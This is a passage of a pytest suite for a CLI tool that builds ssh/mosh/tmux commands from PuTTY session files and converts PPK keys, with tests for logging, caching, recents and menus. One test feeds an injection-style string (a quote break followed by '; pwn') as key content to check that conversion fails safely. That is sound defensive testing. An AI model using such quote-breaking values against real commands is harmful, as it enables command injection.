        window (tmux auto-names the session '0'). Session must be named
        with -s NAME; set-option/pipe-pane run TARGETLESS ('-t name'
        breaks for dotted names: tmux parses 'foo.com' as window 'foo'
        + pane 'com' - 'can't find pane: com' - and the ';' chain dies
        before the pipe starts)."""
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        monkeypatch.delenv("TMUX", raising=False)
        argv, _ = build_ssh_command(
            "My Session", {"HostName": "h"}, reg_path=tmp_path / "r.reg",
            tmux=True,
        )
        s_idx = argv.index("-s")
        assert argv[s_idx + 1] == "My_Session"          # session named
        assert argv[argv.index("-n") + 1] == "My_Session"
        so_idx = argv.index("set-option")
        assert argv[so_idx + 1] == "destroy-unattached"  # targetless
        pp_idx = argv.index("pipe-pane")
        assert argv[pp_idx + 1] == "-o"                  # targetless
        assert argv[pp_idx + 2].startswith("cat >> ")
        assert argv[argv.index("destroy-unattached") + 1] == "on"

    def test_inside_tmux_targets_window(self, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        monkeypatch.setenv("TMUX", "/tmp/tmux-0/default,0,0")
        argv, _ = build_ssh_command(
            "s", {"HostName": "h"}, reg_path=tmp_path / "r.reg", tmux=True,
        )
        assert argv[1] == "new-window"
        assert "set-option" not in argv  # window needs no destroy-unattached
        pp_idx = argv.index("pipe-pane")
        assert argv[pp_idx + 1] == "-o"          # targetless (dot-safe)
        assert argv[pp_idx + 2].startswith("cat >> ")

    def test_wrap_tmux_dotted_name_gets_working_pipe(self, tmp_path,
                                                     monkeypatch):
        """THE BUG: 'rodriguez-jr.com' never logged - tmux read '-t
        rodriguez-jr.com' as pane 'com'. The pipe must target the
        current pane and survive real dotted launches."""
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        monkeypatch.delenv("TMUX", raising=False)
        argv, _ = build_ssh_command(
            "rodriguez-jr.com", {"HostName": "rodriguez-jr.com"},
            reg_path=tmp_path / "r.reg", tmux=True,
        )
        pp_idx = argv.index("pipe-pane")
        assert argv[pp_idx:pp_idx + 2] == ["pipe-pane", "-o"]
        assert "rodriguez-jr.com" in argv[argv.index("-s") + 1
                                         if "-s" in argv else
                                         argv.index("-n") + 1]

    def test_mosh_basic(self, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        argv, tk = build_ssh_command(
            "m", {"HostName": "h.example.com", "Protocol": "mosh"},
            reg_path=tmp_path / "r.reg", tmux=False,
        )
        assert argv[0] == "mosh"
        assert "h.example.com" in argv
        assert tk is None

    def test_mosh_user_port_key(self, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        keys_dir = tmp_path / "keys"
        keys_dir.mkdir()
        shutil.copy(PPK_FIXTURE, keys_dir / "id.ppk")
        argv, tk = build_ssh_command(
            "m",
            {"HostName": "h.example.com", "Protocol": "mosh", "UserName": "u",
             "PortNumber": "2222", "PublicKeyFile": "keys/id.ppk"},
            reg_path=tmp_path / "r.reg", tmux=False,
        )
        assert argv[0] == "mosh"
        ssh_flag = next(a for a in argv if a.startswith("--ssh="))
        assert "-p" in ssh_flag
        assert "-i" in ssh_flag
        assert tk is not None
        Path(tk).unlink(missing_ok=True)

    def test_mosh_tmux_wrapper(self, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        argv, _ = build_ssh_command(
            "m", {"HostName": "h", "Protocol": "mosh"},
            reg_path=tmp_path / "r.reg", tmux=True,
        )
        assert argv[0] == "tmux"
        assert any(a.startswith("mosh ") or a == "mosh" for a in argv)

    def test_commandline_args_passthrough(self, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        argv, _ = build_ssh_command(
            "s",
            {"HostName": "h", "CommandLineArgs": "-o Compression=yes -L 8080:localhost:80"},
            reg_path=tmp_path / "r.reg", tmux=False,
        )
        tokens = shlex.split(" ".join(argv))
        assert "-o" in tokens and "Compression=yes" in tokens
        assert "-L" in tokens and "8080:localhost:80" in tokens

    def test_commandline_args_malformed_warns(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        argv, _ = build_ssh_command(
            "s",
            {"HostName": "h", "CommandLineArgs": "-o 'unterminated"},
            reg_path=tmp_path / "r.reg", tmux=False,
        )
        assert "Warning" in capsys.readouterr().err
        assert "-o" not in argv  # malformed args not half-applied

    def test_commandline_args_ignored_for_mosh(self, tmp_path, monkeypatch):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        argv, _ = build_ssh_command(
            "m",
            {"HostName": "h", "Protocol": "mosh", "CommandLineArgs": "-o X=yes"},
            reg_path=tmp_path / "r.reg", tmux=False,
        )
        assert "-o" not in argv


# ── PPK conversion + cache ───────────────────────────────────────────────────

class TestPpkConvert:
    def _scratch_cache(self, monkeypatch, tmp_path):
        cache = tmp_path / "ppkcache"
        monkeypatch.setenv("PUTTY_PPK_CACHE_DIR", str(cache))
        return cache

    def test_conversion_produces_openssh_key(self, monkeypatch, tmp_path):
        self._scratch_cache(monkeypatch, tmp_path)
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".ppk", delete=False) as f:
            f.write(Path(PPK_FIXTURE).read_bytes())
            ppk = f.name
        key = convert_ppk_to_openssh(ppk)
        assert key is not None
        content = Path(key).read_text()
        assert content.startswith("-----BEGIN")
        Path(key).unlink()

    def test_cache_hit_second_time(self, monkeypatch, tmp_path):
        cache = self._scratch_cache(monkeypatch, tmp_path)
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".ppk", delete=False) as f:
            f.write(Path(PPK_FIXTURE).read_bytes())
            ppk = f.name

        first = convert_ppk_to_openssh(ppk)
        assert first is not None
        assert isinstance(first, str)  # regression: cache hit must be str
        assert str(cache) in first  # installed into cache
        mtime = Path(first).stat().st_mtime_ns

        second = convert_ppk_to_openssh(ppk)
        assert isinstance(second, str)  # not a Path
        assert second == first
        assert Path(first).stat().st_mtime_ns == mtime  # not rewritten

    def test_cached_key_feeds_build_ssh_command(self, monkeypatch, tmp_path):
        """Regression: a warm cache + build_ssh_command must not raise
        TypeError from shlex.quote(PosixPath)."""
        self._scratch_cache(monkeypatch, tmp_path)
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        keys_dir = tmp_path / "keys"
        keys_dir.mkdir()
        shutil.copy(PPK_FIXTURE, keys_dir / "id.ppk")
        reg = tmp_path / "putty.reg"
        reg.touch()
        session = {"HostName": "h", "PublicKeyFile": "keys/id.ppk"}

        argv1, key1 = build_ssh_command("s", session, reg_path=reg)  # miss
        argv2, key2 = build_ssh_command("s", session, reg_path=reg)  # hit
        assert isinstance(key2, str)
        assert key1 == key2
        assert shlex.quote(key2) in " ".join(a for a in ssh_tokens(argv2))

    def test_cache_invalidated_on_mtime_change(self, monkeypatch, tmp_path):
        self._scratch_cache(monkeypatch, tmp_path)
        import os
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".ppk", delete=False) as f:
            f.write(Path(PPK_FIXTURE).read_bytes())
            ppk = f.name

        first = convert_ppk_to_openssh(ppk)
        assert first is not None

        # Touch the source .ppk with a much newer mtime
        far_future = time.time() + 100000
        os.utime(ppk, (far_future, far_future))

        second = convert_ppk_to_openssh(ppk)
        assert second is not None
        assert second != first

    def test_missing_key_file(self, monkeypatch, tmp_path):
        self._scratch_cache(monkeypatch, tmp_path)
        assert convert_ppk_to_openssh(str(tmp_path / "nope.ppk")) is None

    def test_garbage_key_fails_gracefully(self, monkeypatch, tmp_path):
        self._scratch_cache(monkeypatch, tmp_path)
        bad = tmp_path / "bad.ppk"
        bad.write_text("this is not a ppk\n")
        assert convert_ppk_to_openssh(str(bad)) is None

    def test_key_permissions_0600(self, monkeypatch, tmp_path):
        self._scratch_cache(monkeypatch, tmp_path)
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".ppk", delete=False) as f:
            f.write(Path(PPK_FIXTURE).read_bytes())
            ppk = f.name
        key = convert_ppk_to_openssh(ppk)
        assert key is not None
        assert (Path(key).stat().st_mode & 0o777) == 0o600

    def test_cache_unavailable_falls_back_to_temp(self, monkeypatch, tmp_path):
        """Unwritable cache dir -> keep a usable temp key instead of failing."""
        cache = tmp_path / "ppkcache"
        monkeypatch.setenv("PUTTY_PPK_CACHE_DIR", str(cache))
        # Simulate unwritable cache: mkdir raises
        real_mkdir = Path.mkdir
        def fake_mkdir(self, *a, **k):
            if str(self) == str(cache):
                raise PermissionError("denied")
            return real_mkdir(self, *a, **k)
        monkeypatch.setattr(Path, "mkdir", fake_mkdir)
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".ppk", delete=False) as f:
            f.write(Path(PPK_FIXTURE).read_bytes())
            ppk = f.name
        key = convert_ppk_to_openssh(ppk)
        assert key is not None
        assert str(cache) not in key  # fell back to temp file outside cache
        Path(key).unlink(missing_ok=True)

    def test_puttygen_garbage_fails_clean(self, monkeypatch, tmp_path, capsys):
        self._scratch_cache(monkeypatch, tmp_path)
        bad = tmp_path / "bad.ppk"
        bad.write_text("'\"; pwn\n")
        assert convert_ppk_to_openssh(str(bad)) is None
        assert "puttygen failed" in capsys.readouterr().err

    def test_puttygen_missing_path(self, monkeypatch, tmp_path, capsys):
        """subprocess raising FileNotFoundError -> friendly message, None."""
        import subprocess as sp
        self._scratch_cache(monkeypatch, tmp_path)
        monkeypatch.setattr(
            sp, "run",
            lambda *a, **k: (_ for _ in ()).throw(FileNotFoundError("puttygen")),
        )
        src = tmp_path / "k.ppk"
        shutil.copy(PPK_FIXTURE, src)
        assert convert_ppk_to_openssh(str(src)) is None
        assert "putty-tools" in capsys.readouterr().err

    def test_unexpected_exception_cleanup(self, monkeypatch, tmp_path, capsys):
        """A generic failure mid-conversion cleans up the tmp key."""
        import subprocess as sp
        self._scratch_cache(monkeypatch, tmp_path)
        monkeypatch.setattr(
            sp, "run",
            lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")),
        )
        src = tmp_path / "k.ppk"
        shutil.copy(PPK_FIXTURE, src)
        assert convert_ppk_to_openssh(str(src)) is None
        assert "Key conversion error" in capsys.readouterr().err
        # no stray .key temp files left in the system temp dir
        import glob
        stray = [f for f in glob.glob("/tmp/tmp*.key")
                 if time.time() - Path(f).stat().st_mtime < 5]
        assert not stray


class TestPpkPathResolution:
    """Windows-style and relative PublicKeyFile path handling."""

    def test_conversion_failure_fallthrough(self, monkeypatch, tmp_path, capsys):
        """convert_ppk_to_openssh returning None -> no -i, warning printed."""
        from utils import ssh_command_util as scu
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        keys_dir = tmp_path / "keys"
        keys_dir.mkdir()
        shutil.copy(PPK_FIXTURE, keys_dir / "id.ppk")
        monkeypatch.setattr(scu, "convert_ppk_to_openssh", lambda p: None)
        argv, temp_key = build_ssh_command(
            "s",
            {"HostName": "h", "PublicKeyFile": "keys/id.ppk"},
            reg_path=tmp_path / "putty.reg",
        )
        assert "-i" not in ssh_tokens(argv)
        assert temp_key is None
        assert "conversion failed" in capsys.readouterr().out

    def test_key_file_not_found_message(self, monkeypatch, tmp_path, capsys):
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        argv, temp_key = build_ssh_command(
            "s",
            {"HostName": "h", "PublicKeyFile": "C:\\nope\\missing.ppk"},
            reg_path=tmp_path / "putty.reg",
        )
        assert temp_key is None
        assert "-i" not in ssh_tokens(argv)
        assert "Key file not found" in capsys.readouterr().out

    def test_windows_drive_path_resolved(self, monkeypatch, tmp_path, capsys):
        """C:\\... style .ppk paths resolve under the WSL mount root."""
        from utils import ssh_command_util as scu
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        monkeypatch.setattr(scu, "WSL_MNT_ROOT", tmp_path)  # acts as /mnt
        c_drive = tmp_path / "c" / "keys"
        c_drive.mkdir(parents=True)
        shutil.copy(PPK_FIXTURE, c_drive / "id.ppk")
        argv, temp_key = build_ssh_command(
            "s",
            {"HostName": "h", "PublicKeyFile": "C:\\keys\\id.ppk"},
            reg_path=tmp_path / "putty.reg",
        )
        out = capsys.readouterr().out
        assert "Using key" in out
        assert temp_key is not None
        Path(temp_key).unlink(missing_ok=True)

    def test_absolute_posix_path_preferred(self, monkeypatch, tmp_path, capsys):
        """An existing absolute path is used before reg-relative lookup."""
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        abs_key = tmp_path / "abs.ppk"
        shutil.copy(PPK_FIXTURE, abs_key)
        reg_dir_key = tmp_path / "regdir.ppk"
        shutil.copy(PPK_FIXTURE, reg_dir_key)
        argv, temp_key = build_ssh_command(
            "s",
            {"HostName": "h", "PublicKeyFile": str(abs_key)},
            reg_path=tmp_path / "putty.reg",
        )
        assert temp_key is not None
        assert "abs.ppk" in capsys.readouterr().out
        Path(temp_key).unlink(missing_ok=True)

    def test_malformed_windows_path_guard(self, monkeypatch, tmp_path, capsys):
        """A ':' / '\\' path that breaks split() must not kill the build."""
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        # single-char path with ':' and '\' triggers the ValueError branch
        argv, temp_key = build_ssh_command(
            "s", {"HostName": "h", "PublicKeyFile": ":\\"},
            reg_path=None,
        )
        assert temp_key is None
        assert "Key file not found" in capsys.readouterr().out

    def test_windows_path_exactly_three_chars(self, monkeypatch, tmp_path, capsys):
        """Drive-prefix check bounds: ':' must be within first 3 chars."""
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        # colon beyond 3rd char -> wsl branch skipped entirely
        argv, temp_key = build_ssh_command(
            "s", {"HostName": "h", "PublicKeyFile": "ab:c\\d"},
            reg_path=None,
        )
        assert temp_key is None

    def test_log_dir_falls_back_to_home(self, monkeypatch, tmp_path):
        """No env var and no reg_path -> ~/.putty-cli/logs."""
        monkeypatch.delenv("PUTTY_LOG_DIR", raising=False)
        argv, _ = build_ssh_command("s", {"HostName": "h"}, reg_path=None)
        assert str(Path.home() / ".putty-cli" / "logs") in " ".join(argv)


# ── Recents metadata + display suffixes (items 8+9) ──────────────────────────

class TestRecentsMetadata:
    def test_parse_line_edge_cases(self):
        from utils.recent_sessions_util import _parse_line, _serialize
        assert _parse_line("") is None
        assert _parse_line("   ") is None
        # leading-tab lines strip to a valid plain name (documented behavior)
        assert _parse_line("\tno_name") == {"name": "no_name", "ts": None, "exit": None}
        e = _parse_line("name")
        assert e == {"name": "name", "ts": None, "exit": None}
        e = _parse_line("name\tbadts")
        assert e["ts"] is None                      # malformed ts -> None
        e = _parse_line("name\t123\tbadexit")
        assert e["ts"] == 123 and e["exit"] is None  # malformed exit -> None
        e = _parse_line("name\t123\t255")
        assert e == {"name": "name", "ts": 123, "exit": 255}
        assert _serialize(e) == "name\t123\t255"
        assert _serialize({"name": "x"}) == "x"

    def test_load_recent_entries_missing_and_unreadable(self, tmp_path, monkeypatch):
        from utils.recent_sessions_util import load_recent_entries
        assert load_recent_entries(tmp_path / "nope") == {}
        f = tmp_path / "recent.txt"
        f.write_bytes(b"\xff\xfe\xff")
        assert load_recent_entries(f) == {}

    def test_load_recent_entries_dedupes_first_wins(self, tmp_path):
        from utils.recent_sessions_util import load_recent_entries
        f = tmp_path / "recent.txt"
        f.write_text("a\t111\t0\na\t222\t3\n", encoding="utf-8")
        entries = load_recent_entries(f)
        assert entries["a"]["ts"] == 111  # newest (first) wins

    def test_update_unwritable_is_silent(self, tmp_path, monkeypatch):
        from utils.recent_sessions_util import update_recent_sessions
        f = tmp_path / "recent.txt"
        f.write_text("seed\n", encoding="utf-8")
        builtins_target = "builtins.open"

        def broken_open(*a, **k):
            raise OSError("denied")

        monkeypatch.setattr(builtins_target, broken_open)
        update_recent_sessions(f, "x")  # must not raise

    def test_update_stale_temp_cleanup(self, tmp_path):
        """If os.replace works, no temp lingers; failure path tolerates."""
        f = tmp_path / "recent.txt"
        update_recent_sessions(f, "x")
        leftovers = list(tmp_path.glob(".putty_recent_*"))
        assert not leftovers

    def test_mixed_format_file(self, tmp_path):
        """Legacy names + TSV lines coexist."""
        f = tmp_path / "recent.txt"
        f.write_text("oldplain\nnew\t1700000000\t0\n", encoding="utf-8")
        entries = load_recent_entries(f)
        assert entries["oldplain"]["ts"] is None
        assert entries["new"]["ts"] == 1700000000


# ── Interactive main() flows (coverage: pick/action/missing-binary paths) ────

class TestInteractiveFlows:
    def _fake_menu(self, monkeypatch, pick_sequence):
        """Replace putty.TerminalMenu with a scripted picker."""
        seq = iter(pick_sequence)

        class FakeMenu:
            def __init__(self, *a, **k):
                pass

            def show(self):
                try:
                    return next(seq)
                except StopIteration:
                    return None

        monkeypatch.setattr(putty, "TerminalMenu", FakeMenu)

    def test_menu_cancel_exits_zero(self, monkeypatch, tmp_path):
        monkeypatch.setenv("PUTTY_REG_PATH", "tests/data/sample.reg")
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        self._fake_menu(monkeypatch, [None])
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            rc = putty.main(["--no-tui"])
        assert rc == 0
        assert "cancelled" in out.getvalue()

    def test_separator_pick_reprompts_then_cancel(self, monkeypatch, tmp_path, capsys):
        """Choosing a separator row re-shows the menu (legacy loop path)."""
        monkeypatch.setenv("PUTTY_REG_PATH", "tests/data/sample.reg")
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        # session list: [recent-header, ..., separator, items...]; pick sep idx 6
        self._fake_menu(monkeypatch, [6, None])
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
            rc = putty.main(["--no-tui"])
        assert rc == 0

    def test_action_back_returns_to_sessions(self, monkeypatch, tmp_path):
        monkeypatch.setenv("PUTTY_REG_PATH", "tests/data/sample.reg")
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        # first pick: session prod-db (index 5 in default file), action=Back,
        # then cancel session list
        self._fake_menu(monkeypatch, [3, None, None])
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            rc = putty.main(["--no-tui"])
        assert rc == 0
        assert out.getvalue().count("Selection cancelled") == 1

    def test_action_connect_runs_and_records(self, monkeypatch, tmp_path):
        import subprocess as sp
        monkeypatch.setenv("PUTTY_REG_PATH", "tests/data/sample.reg")
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        monkeypatch.setattr(shutil, "which", lambda n: "/usr/bin/tmux" if n == "tmux" else None)
        monkeypatch.setattr(
            sp, "run", lambda argv, **k: sp.CompletedProcess(argv, 0))
        # pick prod-db, action Connect (index 0)
        self._fake_menu(monkeypatch, [3, 0])
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            rc = putty.main(["--no-tui"])
        assert rc == 0
        recent = tmp_path / ".putty_recent_sessions"
        assert recent.exists()

    def test_action_ping_invoked(self, monkeypatch, tmp_path):
        monkeypatch.setenv("PUTTY_REG_PATH", "tests/data/sample.reg")
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        calls = []
        monkeypatch.setattr(putty, "ping_host", lambda h, p="22": calls.append((h, p)) or 0)
        # pick prod-db, action=Ping (index 2)
        self._fake_menu(monkeypatch, [3, 2])
        with contextlib.redirect_stdout(io.StringIO()):
            rc = putty.main(["--no-tui"])
        assert rc == 0
        assert calls and calls[0][0] == "web1.example.com"

    def test_action_copy_invoked(self, monkeypatch, tmp_path):
        monkeypatch.setenv("PUTTY_REG_PATH", "tests/data/sample.reg")
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        # pick prod-db, action=Copy (index 1)
        self._fake_menu(monkeypatch, [3, 1])
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            rc = putty.main(["--no-tui"])
        assert rc == 0
        assert "Copied" in out.getvalue()

    def test_import_error_message(self, monkeypatch, capsys):
        """simple-term-menu missing -> friendly venv instructions."""
        # putty raises SystemExit(1) at import time with guidance; simulate
        # by importing a fresh module alias with the dependency blocked.
        import builtins
        import importlib.util
        real_import = builtins.__import__

        def fake_import(name, *a, **k):
            if name == "simple_term_menu":
                raise ImportError(name)
            return real_import(name, *a, **k)

        spec = importlib.util.spec_from_file_location(
            "putty_fresh", Path(__file__).resolve().parent.parent / "putty.py")
        module = importlib.util.module_from_spec(spec)
        monkeypatch.setattr(builtins, "__import__", fake_import)
        with pytest.raises(SystemExit) as exc:
            spec.loader.exec_module(module)  # type: ignore[union-attr]
        assert exc.value.code == 1
        assert "simple-term-menu not installed" in capsys.readouterr().err

    def test_empty_reg_clear_error(self, monkeypatch, tmp_path, capsys):
        reg = tmp_path / "empty.reg"
        reg.write_text("nothing here\n", encoding="utf-8")
        monkeypatch.setenv("PUTTY_REG_PATH", str(reg))
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        rc = putty.main(["--connect", "x"])
        assert rc == 1
        assert "no session named" in capsys.readouterr().err.lower()

    def test_all_archived_reg_error(self, monkeypatch, tmp_path, capsys):
        reg = tmp_path / "reg.reg"
        reg.write_text(
            '[HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\xxx-archived]\n'
            '"HostName"="h"\n', encoding="utf-8")
        monkeypatch.setenv("PUTTY_REG_PATH", str(reg))
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        rc = putty.main(["--connect", "x"])
        assert rc == 1

    def test_format_relative_time(self, monkeypatch):
        import time as t

        from utils.recent_sessions_util import format_relative_time
        now = int(t.time())
        monkeypatch.setattr(t, "time", lambda: now)
        assert format_relative_time(None) == ""
        assert format_relative_time(now - 5) == "5s ago" or \
            format_relative_time(now) == "just now"
        assert format_relative_time(now - 120) == "2m ago"
        assert format_relative_time(now - 7200) == "2h ago"
        assert format_relative_time(now - 90000) == "1d ago"
        assert format_relative_time(now + 999) == "just now"  # future clamp

    def test_menu_shows_ago_and_failure_marker(self):
        import time as t
        sessions = {"a": {"HostName": "a"}}
        entries = {"a": {"ts": int(t.time()) - 7200, "exit": 255}}
        items = list(generate_menu_items(sessions, ["a"], recent_entries=entries))
        display = next(d for d, n in items if n == "a")
        assert "(2h ago ✗)" in display

    def test_menu_healthy_recent_shows_ago_only(self):
        import time as t
        sessions = {"a": {"HostName": "a"}}
        entries = {"a": {"ts": int(t.time()) - 300, "exit": 0}}
        items = list(generate_menu_items(sessions, ["a"], recent_entries=entries))
        display = next(d for d, n in items if n == "a")
        assert "5m ago" in display and "✗" not in display

    def test_nonrecent_no_metadata_suffix(self):
        sessions = {"a": {"HostName": "a"}, "b": {"HostName": "b"}}
        entries = {"a": {"ts": 123, "exit": 0}}
        items = list(generate_menu_items(sessions, ["a"], recent_entries=entries))
        b_display = next(d for d, n in items if n == "b")
        assert "ago" not in b_display

    def test_atomic_write_replaces_file(self, tmp_path):
        """Item 25: update writes via os.replace - target always complete."""
        f = tmp_path / "recent.txt"
        f.write_text("seed\n", encoding="utf-8")
        inode_before = f.stat().st_ino
        update_recent_sessions(f, "x", exit_code=0)
        inode_after = f.stat().st_ino
        assert inode_before != inode_after  # os.replace created a new file
        assert load_recent_sessions(f, {"x": {}, "seed": {}})[0] == "x"


# ── Logs viewer (item 11) + dynamic separators (item 12) ─────────────────────

class _FakeMenuClass:
    """Stands in for TerminalMenu without needing a TTY."""

    show_result = 0

    def __init__(self, *a, **k):
        pass

    def show(self):
        return _FakeMenuClass.show_result


def _patch_menu(monkeypatch, result=0):
    _FakeMenuClass.show_result = result
    # pick_and_view_log imports TerminalMenu from simple_term_menu at call
    # time, so patching the source module is the reliable seam.
    monkeypatch.setattr("simple_term_menu.TerminalMenu", _FakeMenuClass)


class TestLogsViewer:
    def test_list_logs_newest_first(self, tmp_path):
        from utils.logs_util import list_logs
        d = tmp_path / "logs"
        d.mkdir()
        (d / "old.log").write_text("x")
        (d / "new.log").write_text("yy")
        far_past = time.time() - 10000
        import os
        os.utime(d / "old.log", (far_past, far_past))
        logs = list_logs(d)
        assert [p.name for p, _, _ in logs] == ["new.log", "old.log"]

    def test_list_logs_empty_dir(self, tmp_path):
        from utils.logs_util import list_logs
        assert list_logs(tmp_path) == []

    def test_format_log_line(self):
        from utils.logs_util import format_log_line
        line = format_log_line(Path("2026-01-01_1200-myhost.log"), 2048, 0)
        assert "myhost.log" in line and "2K" in line

    def test_view_log_pager_invoked(self, tmp_path, monkeypatch):
        from utils import logs_util
        d = tmp_path / "logs"
        d.mkdir()
        (d / "a.log").write_text("hello")
        import subprocess as sp
        calls = []
        monkeypatch.setattr(sp, "run",
                            lambda argv, **k: calls.append(argv)
                            or sp.CompletedProcess(argv, 0))
        monkeypatch.delenv("PAGER", raising=False)
        _patch_menu(monkeypatch, result=0)
        rc = logs_util.pick_and_view_log(d)
        assert rc == 0
        assert calls and calls[0][0] == "less"

    def test_view_log_no_pager_dumps_stdout(self, tmp_path, monkeypatch, capsys):
        from utils import logs_util
        d = tmp_path / "logs"
        d.mkdir()
        (d / "a.log").write_text("hello")
        import subprocess as sp
        monkeypatch.setattr(sp, "run",
                            lambda argv, **k: (_ for _ in ()).throw(FileNotFoundError()))
        _patch_menu(monkeypatch, result=0)
        rc = logs_util.pick_and_view_log(d)
        assert rc == 0
        assert "hello" in capsys.readouterr().out

    def test_view_log_empty(self, tmp_path, capsys):
        from utils.logs_util import pick_and_view_log
        assert pick_and_view_log(tmp_path) is None
        assert "No session logs" in capsys.readouterr().err

    def test_view_log_esc_returns_none(self, tmp_path, monkeypatch):
        from utils import logs_util
        d = tmp_path / "logs"
        d.mkdir()
        (d / "a.log").write_text("x")
        _patch_menu(monkeypatch, result=None)
        assert logs_util.pick_and_view_log(d) is None

    def test_cmdline_logs_flag(self, monkeypatch, tmp_path):
        d = tmp_path / "logs"
        d.mkdir()
        (d / "a.log").write_text("hello")
        _patch_menu(monkeypatch, result=None)
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            rc = putty.main(["--logs", "--logs-dir", str(d)])
        assert rc == 0  # Esc exits gracefully


class TestDynamicSeparator:
    def test_separator_explicit_width(self):
        assert separator("TAG", width=20).startswith("── TAG")
        assert len(separator("TAG", width=20)) == 20
        assert separator("", width=10) == "─" * 10

    def test_separator_min_80(self):
        # text never truncated, line never exceeds terminal width
        assert len(separator("X", width=10)) >= 4
        assert separator("X", width=5).startswith("── X")
        assert len(separator("", width=200)) == 200

    def test_menu_uses_dynamic_separator(self, monkeypatch):
        # Force a known terminal width
        import shutil
        monkeypatch.setattr(
            shutil, "get_terminal_size", lambda fallback=(80, 24): __import__(
                "shutil").os.terminal_size((123, 24)))
        sessions = {"a": {"HostName": "a"}, "b": {"HostName": "b"}}
        items = list(generate_menu_items(sessions, ["a"]))
        sep = separator("", width=123)
        assert sep in [d for d, _ in items]


# ── No-tmux fallback (item 27) ───────────────────────────────────────────────

class TestNoTmuxFallback:
    def test_auto_falls_back_when_tmux_missing(self, monkeypatch, tmp_path, capsys):
        """No tmux binary -> bare ssh argv, no log side effects."""
        monkeypatch.setattr(shutil, "which", lambda name: None)
        argv, tk, tmux_used = putty.build_and_connect(
            "s", {"HostName": "h.example.com"},
            tmp_path / "r.reg", use_tmux=None,
        )
        assert tmux_used is False
        assert argv[0] == "ssh"
        assert not tk

    def test_forced_no_tmux(self, tmp_path):
        argv, tk, tmux_used = putty.build_and_connect(
            "s", {"HostName": "h.example.com"},
            tmp_path / "r.reg", use_tmux=False,
        )
        assert argv[0] == "ssh" and tmux_used is False

    def test_tmux_present_uses_tmux(self, monkeypatch, tmp_path):
        monkeypatch.setattr(shutil, "which", lambda name: "/usr/bin/tmux")
        argv, tk, tmux_used = putty.build_and_connect(
            "s", {"HostName": "h.example.com"},
            tmp_path / "r.reg", use_tmux=None,
        )
        assert tmux_used is True
        assert argv[0] == "tmux" or argv[:3] == ["tmux", "new-session"]

    def test_no_tmux_flag_reaches_connect(self, monkeypatch, tmp_path):
        """--no-tmux flag propagates to connect_to_session."""
        calls = {}
        monkeypatch.setenv("PUTTY_REG_PATH", "tests/data/sample.reg")
        monkeypatch.setattr(putty, "connect_to_session",
                            lambda *a, **k: calls.update(k) or 0)
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            putty.main(["--connect", "prod-db", "--dry-run", "--no-tmux"])
        assert calls.get("use_tmux") is False

    def test_missing_tmux_error_mentions_tip(self, monkeypatch, tmp_path, capsys):
        """tmux vanished mid-flight -> error suggests --no-tmux."""
        import subprocess as sp
        monkeypatch.setattr(shutil, "which", lambda name: "/usr/bin/tmux")
        monkeypatch.setattr(
            sp, "run",
            lambda *a, **k: (_ for _ in ()).throw(FileNotFoundError("tmux")),
        )
        rc = putty.connect_to_session(
            "s", {"HostName": "h.example.com"},
            tmp_path / "r.reg", tmp_path / "rec", use_tmux=True,
        )
        assert rc == 1
        err = capsys.readouterr().err
        assert "--no-tmux" in err

    def test_ssh_failure_recorded_with_exit(self, monkeypatch, tmp_path):
        """no-tmux ssh exit 255 still recorded (fix 8 interplay)."""
        import subprocess as sp
        monkeypatch.setenv("PUTTY_LOG_DIR", str(tmp_path / "logs"))
        monkeypatch.setattr(
            sp, "run", lambda *a, **k: sp.CompletedProcess("ssh", 255))
        putty.connect_to_session(
            "s", {"HostName": "127.0.0.1", "PortNumber": "1"},
            tmp_path / "r.reg", tmp_path / "rec", use_tmux=False,
        )
        entries = load_recent_entries(tmp_path / "rec")
        assert entries["s"]["exit"] == 255


# ── Reg file reload on change (item 26) ──────────────────────────────────────

class TestRegReload:
